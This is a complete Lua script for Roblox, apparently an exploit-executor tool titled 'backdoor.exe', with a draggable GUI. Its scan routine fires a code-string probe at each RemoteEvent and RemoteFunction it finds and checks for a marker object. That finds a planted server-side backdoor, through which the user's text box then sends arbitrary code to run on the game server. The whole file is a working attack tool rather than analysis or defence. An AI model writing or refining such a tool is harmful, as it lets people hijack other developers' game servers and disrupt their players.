local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local Lighting = game:GetService("Lighting")
local Workspace = game:GetService("Workspace")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local JointsService = game:GetService("JointsService")
local StarterGui = game:GetService("StarterGui")

local LocalPlayer = Players.LocalPlayer
local RobloxReplicatedStorage = game:FindService("RobloxReplicatedStorage")
local guiParent = (gethui and gethui()) or CoreGui

local attached = false
local backdoor = nil
local remoteCodes = {}
local STRING_VALUE_NAME = tostring(math.random(1000000, 9999999))
local commonPlaces = {ReplicatedStorage, Workspace, Lighting}

if guiParent:FindFirstChild("BackdoorExe") then
	guiParent.BackdoorExe:Destroy()
end

local UI = Instance.new("ScreenGui")
UI.Name = "BackdoorExe"
UI.ResetOnSpawn = false
UI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
UI.Parent = guiParent

local Main = Instance.new("Frame")
Main.Name = "Main"
Main.Size = UDim2.new(0, 420, 0, 280)
Main.Position = UDim2.new(0.5, -210, 0.5, -140)
Main.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
Main.BorderSizePixel = 0
Main.Active = true
Main.Parent = UI
Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 10)

local TitleBar = Instance.new("Frame")
TitleBar.Size = UDim2.new(1, 0, 0, 36)
TitleBar.BackgroundColor3 = Color3.fromRGB(28, 28, 34)
TitleBar.BorderSizePixel = 0
TitleBar.Parent = Main
Instance.new("UICorner", TitleBar).CornerRadius = UDim.new(0, 10)

local TitleFix = Instance.new("Frame")
TitleFix.Size = UDim2.new(1, 0, 0, 12)
TitleFix.Position = UDim2.new(0, 0, 1, -12)
TitleFix.BackgroundColor3 = Color3.fromRGB(28, 28, 34)
TitleFix.BorderSizePixel = 0
TitleFix.Parent = TitleBar

local Title = Instance.new("TextLabel")
Title.BackgroundTransparency = 1
Title.Size = UDim2.new(1, -90, 1, 0)
Title.Position = UDim2.new(0, 12, 0, 0)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 14
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.TextColor3 = Color3.fromRGB(95, 185, 47)
Title.Text = "backdoor.exe"
Title.Parent = TitleBar

local Status = Instance.new("TextLabel")
Status.BackgroundTransparency = 1
Status.Size = UDim2.new(0, 80, 1, 0)
Status.Position = UDim2.new(1, -118, 0, 0)
Status.Font = Enum.Font.Gotham
Status.TextSize = 12
Status.TextColor3 = Color3.fromRGB(180, 180, 190)
Status.Text = "Idle"
Status.Parent = TitleBar

local CloseButton = Instance.new("TextButton")
CloseButton.Size = UDim2.new(0, 28, 0, 28)
CloseButton.Position = UDim2.new(1, -32, 0, 4)
CloseButton.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
CloseButton.Text = "×"
CloseButton.TextColor3 = Color3.new(1, 1, 1)
CloseButton.Font = Enum.Font.GothamBold
CloseButton.TextSize = 16
CloseButton.BorderSizePixel = 0
CloseButton.Parent = TitleBar
Instance.new("UICorner", CloseButton).CornerRadius = UDim.new(0, 6)

local Source = Instance.new("TextBox")
Source.Name = "Source"
Source.Size = UDim2.new(1, -20, 0, 150)
Source.Position = UDim2.new(0, 10, 0, 46)
Source.BackgroundColor3 = Color3.fromRGB(12, 12, 16)
Source.TextColor3 = Color3.fromRGB(220, 220, 230)
Source.PlaceholderText = "print('hello from server')"
Source.PlaceholderColor3 = Color3.fromRGB(90, 90, 105)
Source.Text = ""
Source.TextXAlignment = Enum.TextXAlignment.Left
Source.TextYAlignment = Enum.TextYAlignment.Top
Source.TextWrapped = true
Source.MultiLine = true
Source.ClearTextOnFocus = false
Source.Font = Enum.Font.Code
Source.TextSize = 14
Source.BorderSizePixel = 0
Source.Parent = Main
Instance.new("UICorner", Source).CornerRadius = UDim.new(0, 8)
local srcPad = Instance.new("UIPadding", Source)
srcPad.PaddingLeft = UDim.new(0, 8)
srcPad.PaddingTop = UDim.new(0, 6)

local function makeBtn(text, x, color)
	local b = Instance.new("TextButton")
	b.Size = UDim2.new(0, 90, 0, 30)
	b.Position = UDim2.new(0, x, 1, -42)
	b.BackgroundColor3 = color
	b.Text = text
	b.TextColor3 = Color3.new(1, 1, 1)
	b.Font = Enum.Font.GothamBold
	b.TextSize = 12
	b.BorderSizePixel = 0
	b.Parent = Main
	Instance.new("UICorner", b).CornerRadius = UDim.new(0, 6)
	return b
end

local ScanButton = makeBtn("Scan", 10, Color3.fromRGB(70, 130, 255))
local ExecuteButton = makeBtn("Execute", 110, Color3.fromRGB(95, 185, 47))
local ClearButton = makeBtn("Clear", 210, Color3.fromRGB(50, 50, 62))
local HideButton = makeBtn("Hide", 310, Color3.fromRGB(50, 50, 62))

local dragging, dragStart, startPos
TitleBar.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = true
		dragStart = input.Position
		startPos = Main.Position
	end
end)
game:GetService("UserInputService").InputChanged:Connect(function(input)
	if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
		local d = input.Position - dragStart
		Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
	end
end)
game:GetService("UserInputService").InputEnded:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = false
	end
end)

local function notify(text)
	pcall(function()
		StarterGui:SetCore("SendNotification", {
			Title = "backdoor.exe",
			Text = text,
			Duration = 3
		})
	end)
end

local function setStatus(text, color)
	Status.Text = text
	Status.TextColor3 = color or Color3.fromRGB(180, 180, 190)
end

local function validRemote(rm)
	if rm.ClassName ~= "RemoteEvent" and rm.ClassName ~= "RemoteFunction" then
		return false
	end
	local parent = rm.Parent
	if parent == JointsService then
		return false
	end
	if parent == ReplicatedStorage and rm:FindFirstChild("__FUNCTION") then
		return false
	end
	if rm.Name == "__FUNCTION" and parent and parent.ClassName == "RemoteEvent" then
		return false
	end
	if RobloxReplicatedStorage and rm:IsDescendantOf(RobloxReplicatedStorage) then
		return false
	end
	return true
end

local function scanDescendants(parent)
	local ok, list = pcall(function()
		return parent:GetDescendants()
	end)
	if not ok then
		return false
	end
	for i = 1, #list do
		local descendant = list[i]
		if validRemote(descendant) then
			local remoteCode = tostring(math.random(100000, 999999))
			remoteCodes[remoteCode] = descendant
			local payload = ("i=Instance.new('StringValue', game.Workspace); i.Name='%s'; i.Value='%s'"):format(STRING_VALUE_NAME, remoteCode)
			if descendant.ClassName == "RemoteEvent" then
				pcall(function()
					descendant:FireServer(payload)
				end)
			else
				local waiting = true
				task.spawn(function()
					pcall(function()
						descendant:InvokeServer(payload)
					end)
					waiting = false
				end)
				local t = 0
				while waiting and t < 1 do
					task.wait(0.05)
					t += 0.05
				end
			end
			local marker = Workspace:FindFirstChild(STRING_VALUE_NAME)
			if marker then
				attached = true
				backdoor = remoteCodes[marker.Value]
				if backdoor and backdoor.ClassName == "RemoteEvent" then
					pcall(function()
						backdoor:FireServer(("game.Workspace['%s']:Destroy()"):format(STRING_VALUE_NAME))
					end)
				end
				pcall(function()
					marker:Destroy()
				end)
				return true
			end
		end
	end
	return false
end

local function scanGame()
	setStatus("Scanning...", Color3.fromRGB(255, 200, 80))
	attached = false
	backdoor = nil
	table.clear(remoteCodes)
	STRING_VALUE_NAME = tostring(math.random(1000000, 9999999))

	local found = false
	for i = 1, #commonPlaces do
		if scanDescendants(commonPlaces[i]) then
			found = true
			break
		end
	end
	if not found then
		local children = game:GetChildren()
		for i = 1, #children do
			local child = children[i]
			if not table.find(commonPlaces, child) then
				if scanDescendants(child) then
					found = true
					break
				end
			end
		end
	end

	if found then
		setStatus("Attached", Color3.fromRGB(95, 185, 47))
		notify("Backdoor Found!")
	else
		setStatus("Failed", Color3.fromRGB(255, 90, 90))
		notify("Unable to find backdoor!")
	end
	return found
end

local function executeScript(code)
	if not attached or not backdoor then
		notify("Not attached. Scan first.")
		return
	end
	code = code or Source.Text
	if code == "" then
		return
	end
	if backdoor.ClassName == "RemoteEvent" then
		pcall(function()
			backdoor:FireServer(code)
		end)
	else
		pcall(function()
			backdoor:InvokeServer(code)
		end)
	end
end

ScanButton.MouseButton1Click:Connect(scanGame)
ExecuteButton.MouseButton1Click:Connect(function()
	executeScript()
end)
ClearButton.MouseButton1Click:Connect(function()
	Source.Text = ""
end)
HideButton.MouseButton1Click:Connect(function()
	Source.Visible = not Source.Visible
end)
CloseButton.MouseButton1Click:Connect(function()
	UI:Destroy()
end)
